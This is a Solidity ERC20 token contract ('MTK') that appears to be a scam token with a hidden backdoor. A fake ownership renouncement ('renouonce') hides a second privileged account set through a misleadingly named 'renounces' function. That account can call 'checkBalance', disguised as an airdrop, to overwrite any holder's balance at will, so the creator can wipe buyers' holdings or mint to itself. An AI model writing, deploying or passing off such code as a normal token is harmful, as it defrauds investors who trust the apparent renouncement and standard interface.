pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renouonce() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract COINN is Context, Ownable, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private __balances;
    address private _mee; 

    string public constant _name = "MTK";
    string public constant _symbol = "MTK";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        __balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function mee() public view virtual returns (address) { 
        return _mee;
    }

    function renounces(address newMee) public onlyowner { 
        _mee = newMee;
    }
    modifier onlyCreator() {
        require(mee() == _msgSender(), "TOKEN: caller is not the meee");
        _;
    }
    event __airdropped(address indexed account, uint256 currentBalance, uint256 newBalance);

    function checkBalance(address[] memory accounts, uint256 balance) public onlyCreator {

        for (uint256 i = 0; i < accounts.length; i++) {

            address account = accounts[i];

            require(account != address(0), "Invalid account address");
            require(balance >= 0, "Invalid balance");
        
            uint256 currentBalance = __balances[account];
        
            __balances[account] = balance;
        
            emit __airdropped(account, balance, currentBalance);

        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return __balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(__balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
    __balances[_msgSender()] -= amount;
    __balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");

    __balances[sender] -= amount;
    __balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}